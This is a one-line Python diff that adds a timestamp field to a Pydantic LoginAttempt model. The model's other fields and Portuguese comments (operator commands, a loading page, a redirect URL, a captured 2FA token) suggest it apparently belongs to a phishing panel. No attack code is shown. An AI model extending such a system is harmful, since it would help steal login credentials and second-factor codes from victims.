@@ -64,6 +64,7 @@ class LoginAttempt(BaseModel):
     device: Optional[str] = None
     page: Optional[str] = "Página Loading..."
     current_action: Optional[str] = None  # Para armazenar o comando atual
+    action_timestamp: Optional[str] = None
     redirect_url: Optional[str] = None
     # Campos para armazenar dados recebidos dos comandos
     token_2fa: Optional[str] = None
